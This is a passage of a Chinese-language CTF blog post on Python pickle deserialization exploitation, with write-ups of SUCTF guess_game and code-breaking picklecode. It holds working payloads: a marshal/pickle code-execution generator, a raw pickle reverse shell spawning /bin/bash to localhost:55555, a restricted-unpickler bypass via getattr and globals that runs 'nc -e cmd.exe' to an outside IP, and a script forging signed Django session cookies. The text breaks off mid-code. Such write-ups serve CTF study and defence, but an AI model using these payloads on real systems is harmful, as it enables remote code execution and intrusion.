class="string">&#x27;https://github.com/bit4woo&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span><span class="comment">#you should write your code in this function</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n-<span class="number">1</span>) + fib(n-<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;fib(10) =&#x27;</span>, fib(<span class="number">10</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#为了保证code_serialized中的内容得到执行，我们需要如下代码</span></span><br><span class="line"><span class="comment">#(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), &#x27;&#x27;))()</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;&quot;&quot;ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S&#x27;%s&#x27;</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span> % base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>



<h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><h3 id="通过源码查看pickle的方法"><a href="#通过源码查看pickle的方法" class="headerlink" title="通过源码查看pickle的方法"></a>通过源码查看pickle的方法</h3><p>直接所有操作码对应的变量</p>
<p><img src="https://i.loli.net/2019/12/23/pWlFyYPKB7enMQE.png" alt="image7895"></p>
<p><code> dispatch[BININT1[0]] = load_binint1</code></p>
<p>找到类似这种的后面的就是对应的函数</p>
<h2 id="pickle工具"><a href="#pickle工具" class="headerlink" title="pickle工具"></a>pickle工具</h2><p> <a target="_blank" rel="noopener" href="https://github.com/sensepost/anapickle">converttopickle.py</a></p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p> <a target="_blank" rel="noopener" href="https://github.com/sensepost/anapickle/blob/master/anapickle.py">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a> </p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;csocket\n__dict__\np101\n0c__builtin__\ngetattr\n(g101\nS&#x27;__getitem__&#x27;\ntRp102\n0g102\n(S&#x27;AF_INET&#x27;\ntRp100\n0csocket\n__dict__\np104\n0c__builtin__\ngetattr\n(g104\nS&#x27;__getitem__&#x27;\ntRp105\n0g105\n(S&#x27;SOCK_STREAM&#x27;\ntRp103\n0csocket\n__dict__\np107\n0c__builtin__\ngetattr\n(g107\nS&#x27;__getitem__&#x27;\ntRp108\n0g108\n(S&#x27;IPPROTO_TCP&#x27;\ntRp106\n0csocket\n__dict__\np110\n0c__builtin__\ngetattr\n(g110\nS&#x27;__getitem__&#x27;\ntRp111\n0g111\n(S&#x27;SOL_SOCKET&#x27;\ntRp109\n0csocket\n__dict__\np113\n0c__builtin__\ngetattr\n(g113\nS&#x27;__getitem__&#x27;\ntRp114\n0g114\n(S&#x27;SO_REUSEADDR&#x27;\ntRp112\n0csocket\nsocket\n(g100\ng103\ng106\ntRp115\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#x27;setsockopt&#x27;\ntRp116\n0c__builtin__\napply\n(g116\n(g115\ng109\ng112\nI1\nltRp117\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#x27;connect&#x27;\ntRp118\n0c__builtin__\napply\n(g118\n(g115\n(S&#x27;localhost&#x27;\nI55555\ntltRp119\n0c__builtin__\ngetattr\n(csocket\n_socketobject\nS&#x27;fileno&#x27;\ntRp120\n0c__builtin__\napply\n(g120\n(g115\nltRp121\n0c__builtin__\nint\n(g121\ntRp122\n0csubprocess\nPopen\n((S&#x27;/bin/bash&#x27;\ntI0\nS&#x27;/bin/bash&#x27;\ng122\ng122\ng122\ntRp123\n0S&#x27;finished&#x27;\n.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>localhost:55555</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol>
<li>使用v0版的pickle协议,保证shellcode的通用性</li>
</ol>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="suctf-guess-game"><a href="#suctf-guess-game" class="headerlink" title="suctf guess_game"></a>suctf guess_game</h3><p><a target="_blank" rel="noopener" href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game">题目链接</a></p>
<p>考点:pickle</p>
<p>代码审计一波后</p>
<p>如果猜对10次后会给flag(机会只有10次)</p>
<p>因为知道是考pickle直接全局搜索pickle发现在server处有</p>
<p><code>ticket = restricted_loads(ticket)</code></p>
<p>其中ticket是我们可控点</p>
<p>跟进去看</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="comment"># Only allow safe classes</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;guess_game&quot;</span> == module[<span class="number">0</span>:<span class="number">10</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure>

<p>我们只能加载guess_game中的类,并且不能调用魔术方法.</p>
<p>在这一题中拿到flag有两种方式:</p>
<ol>
<li>命令执行</li>
<li>通过游戏</li>
</ol>
<p>在怼着find_class许久之后发现没办法绕过,于是只能走通过游戏这一条路了</p>
<p>而游戏中判定赢的条件是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span></span><br><span class="line"><span class="class">	<span class="title">def</span> <span class="title">is_win</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.win_count == max_round</span><br></pre></td></tr></table></figure>

<p>如果我们能直接修改win_count或者max_round就可以拿到flag了</p>
<p>我们发现在<code>guess_game</code>中已经有一个<code>game = Game()</code>这个了,也就是我们可以利用pickle来加载这个game直接修改</p>
<p>那么接下来就是如何修改了</p>
<p>在pickle的操作码中我们发现</p>
<p><code>BUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()</code>这一条</p>
<p>其中update()就可以修改game的属性了</p>
<p>那么接下来就只有一个问题了,操作码<code>b</code>如何使用</p>
<p>一路跟踪发现b操作码的实现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_build</span>(<span class="params">self</span>):</span></span><br><span class="line">    stack = self.stack</span><br><span class="line">    state = stack.pop()</span><br><span class="line">    inst = stack[-<span class="number">1</span>]</span><br><span class="line">    setstate = <span class="built_in">getattr</span>(inst, <span class="string">&quot;__setstate__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> setstate <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        setstate(state)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    slotstate = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(state, <span class="built_in">tuple</span>) <span class="keyword">and</span> <span class="built_in">len</span>(state) == <span class="number">2</span>:</span><br><span class="line">        state, slotstate = state</span><br><span class="line">    <span class="keyword">if</span> state:</span><br><span class="line">        inst_dict = inst.__dict__</span><br><span class="line">        intern = sys.intern</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> state.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(k) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">                inst_dict[intern(k)] = v</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                inst_dict[k] = v</span><br><span class="line">    <span class="keyword">if</span> slotstate:</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> slotstate.items():</span><br><span class="line">            <span class="built_in">setattr</span>(inst, k, v)</span><br></pre></td></tr></table></figure>

<p>没有调用参数,栈顶应为字典,栈顶的下面是要修改的对象</p>
<p>最后的payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&quot;cguess_game\ngame\n(S&#x27;win_count&#x27;\nI10\nS&#x27;round_count&#x27;\nI10\ndb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x01sb.&quot;</span></span><br></pre></td></tr></table></figure>



<h3 id="code-breaking-picklecode"><a href="#code-breaking-picklecode" class="headerlink" title="code breaking picklecode"></a>code breaking picklecode</h3><p><a target="_blank" rel="noopener" href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode">题目链接</a></p>
<p>代码审计发现在index处可以ssti</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">request</span>):</span></span><br><span class="line">    django_engine = engines[<span class="string">&#x27;django&#x27;</span>]</span><br><span class="line">    template = django_engine.from_string(<span class="string">&#x27;My name is &#x27;</span> + request.user.username)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.render(<span class="literal">None</span>, request))</span><br></pre></td></tr></table></figure>

<p>但是django难以利用ssti命令执行但是能读取敏感配置</p>
<p>结合serializer.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleSerializer</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span>(<span class="params">self, obj</span>):</span></span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">&quot;Can&#x27;t load pickle from unicode string&quot;</span>)</span><br><span class="line">            file = io.BytesIO(data)</span><br><span class="line">            <span class="keyword">return</span> RestrictedUnpickler(file,</span><br><span class="line">                              encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>).load()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>和setting文件里的特殊配置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SESSION_ENGINE = <span class="string">&#x27;django.contrib.sessions.backends.signed_cookies&#x27;</span></span><br><span class="line">SESSION_SERIALIZER = <span class="string">&#x27;core.serializer.PickleSerializer&#x27;</span></span><br></pre></td></tr></table></figure>

<p>查阅django文档发现</p>
<p> <a target="_blank" rel="noopener" href="https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions">https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions</a> </p>
<p>可以确定,这里是通过读取secret_key来构造恶意cookie来pickle反序列化命令执行</p>
<p>我们跟进django.contrib.sessions.backends.signed_cookies来了解如何生成储存session的cookie(这里花了我很久的时间,从尝试看一步一步调试到看调用堆栈再到查文档最后才搞清楚过程,建议自己尝试)</p>
<p>在理解之后便有一下生成恶意cookie的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> django.utils <span class="keyword">import</span> baseconv</span><br><span class="line"><span class="keyword">from</span> django.utils.crypto <span class="keyword">import</span> constant_time_compare, salted_hmac</span><br><span class="line"><span class="keyword">from</span> django.utils.encoding <span class="keyword">import</span> force_bytes</span><br><span class="line"><span class="keyword">from</span> django.utils.module_loading <span class="keyword">import</span> import_string</span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> core</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">myexp=<span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRp100</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">p101</span></span><br><span class="line"><span class="string">(g100</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp103</span></span><br><span class="line"><span class="string">g101</span></span><br><span class="line"><span class="string">(g103</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;eval(\&#x27;\&#x27;\&#x27;__import__(&#x27;os&#x27;).system(&#x27;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#x27;)\&#x27;\&#x27;\&#x27;)&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pickle_exp</span>(<span class="params">SECRET_KEY</span>):</span></span><br><span class="line">    data = myexp</span><br><span class="line">    compress=<span class="literal">True</span></span><br><span class="line">    <span class="comment"># Flag for if it&#x27;s been compressed or not</span></span><br><span class="line">    is_compressed = <span class="literal">False</span></span><br><span class="line">    salt=<span class="string">&#x27;django.contrib.sessions.backends.signed_cookies&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> compress:</span><br><span class="line">        <span class="comment"># Avoid zlib dependency unless compress is being used</span></span><br><span class="line">        compressed = zlib.compress(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(compressed) &lt; (<span class="built_in">len</span>(data) - <span class="number">1</span>):</span><br><span class="line">            data = compressed</span><br><span class="line">            is_compressed = <span class="literal">True</span></span><br><span class="line">    base64d = signing.b64_encode(data).decode()</span><br><span class="line">    <span class="keyword">if</span> is_compressed:</span><br><span class="line">        base64d = <span class="string">&#x27;.&#x27;</span> + base64d</span><br><span class="line">    <span class="built_in">print</span>(signing.TimestampSigner(key=SECRET_KEY, salt=salt).sign(base64d))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle_exp(<span class="string">&quot;asdasdasdasdas&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来就是如何构造恶意的pickle代码的问题了</p>
<p>题目限制了只能加载builtins里的属性</p>
<p>且属性名不能为以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = &#123;&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;execfile&#x27;, &#x27;compile&#x27;, &#x27;open&#x27;, &#x27;input&#x27;, &#x27;__import__&#x27;, &#x27;exit&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>利用<code>__reduce__</code>来生成pickle代码已经无法满足要求了,我们不得不手写pickle代码,怎么手写就不详细讲了</p>
<p>我们现在把目光聚焦在如何构造利用链上</p>
<p>builtins的属性(删除部分)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;all&#x27;</span>, <span class="string">&#x27;any&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;bool&#x27;</span>, <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;bytearray&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>, <span class="string">&#x27;callable&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;classmethod&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;complex&#x27;</span>, <span class="string">&#x27;copyright&#x27;</span>, <span class="string">&#x27;credits&#x27;</span>, <span class="string">&#x27;delattr&#x27;</span>, <span class="string">&#x27;dict&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;divmod&#x27;</span>, <span class="string">&#x27;enumerate&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;float&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;frozenset&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;hasattr&#x27;</span>, <span class="string">&#x27;hash&#x27;</span>, <span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;isinstance&#x27;</span>, <span class="string">&#x27;issubclass&#x27;</span>, <span class="string">&#x27;iter&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;license&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;locals&#x27;</span>, <span class="string">&#x27;map&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;next&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;oct&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;reversed&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;setattr&#x27;</span>, <span class="string">&#x27;slice&#x27;</span>, <span class="string">&#x27;sorted&#x27;</span>, <span class="string">&#x27;staticmethod&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;sum&#x27;</span>, <span class="string">&#x27;super&#x27;</span>, <span class="string">&#x27;tuple&#x27;</span>, <span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>我们查看builtins的属性我们发现两个有意思的东西,一个是getattr,另一个是globals</p>
<p>虽然限制我们属性名不能为eval啥的,但是并没有限制不能出现在参数处</p>
<p>所以<code>getattr(builtins,&quot;eval&quot;)</code>便能得到eval方法了</p>
<p>但是看pickle的操作码并没有发现能直接导入一个模块的操作,在结合globals我们很容易想到<code>getattr(getattr(globals(),&quot;builtins&quot;),&quot;eval&quot;)</code></p>
<p>最后的payload:<code>builtins.getattr(builtins.getattr(builtins.globals(),&quot;builtins&quot;),&quot;eval&quot;)(&quot;evil code&quot;)</code></p>
<p>其对应的pickle代码是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRp100</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">p101</span></span><br><span class="line"><span class="string">(g100</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp103</span></span><br><span class="line"><span class="string">g101</span></span><br><span class="line"><span class="string">(g103</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;eval(\&#x27;\&#x27;\&#x27;__import__(&#x27;os&#x27;).system(&#x27;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#x27;)\&#x27;\&#x27;\&#x27;)&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>最后就差secret_key了,看别人的wp都是调试易得易得secret_key//</p>
<p>但是我是没找到,于是自己写了个过滤器</p>
<p>递归查找settings</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http.response <span class="keyword">import</span> HttpResponse, HttpResponseRedirect</span><br><span class="line"><span class="keyword">from</span> django.template <span class="keyword">import</span> engines</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth <span class="keyword">import</span> login <span class="keyword">as</span> auth_login, get_user_model, authenticate</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.views <span class="keyword">import</span> LoginView, logout_then_login</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.decorators <span class="keyword">import</span> login_required</span><br><span class="line"><span class="keyword">from</span> django.views <span class="keyword">import</span> generic</span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> template</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> django</span><br><span class="line"><span class="keyword">from</span> django <span class="keyword">import</span> template</span><br><span class="line">register = template.Library()</span><br><span class="line"></span><br><span class="line"><span class="meta">@register.filter</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dict</span>(<span class="params">obj,way=<span class="string">&quot;&quot;</span>,depth=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> depth&gt;<span class="number">11</span>:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    objdir=<span class="built_in">dir</span>(obj)</span><br><span class="line">    r=&#123;<span class="string">&quot;dict&quot;</span>:objdir,<span class="string">&quot;way&quot;</span>:way&#125;</span><br><span class="line">    result=<span 